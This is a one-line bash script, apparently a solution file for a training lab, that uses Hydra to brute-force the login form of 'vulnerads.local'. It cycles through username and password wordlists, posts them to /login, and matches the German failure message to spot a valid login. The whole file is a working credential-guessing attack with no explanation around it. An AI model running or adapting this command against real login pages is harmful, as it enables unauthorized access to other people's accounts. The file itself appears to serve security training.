#!/bin/bash

hydra -L ./benutzernamen_loesung.txt -P ./passwords.txt "vulnerads.local" http-post-form "/login:username=^USER^&password=^PASS^:Benutzername oder Passwort falsch!" -V -F
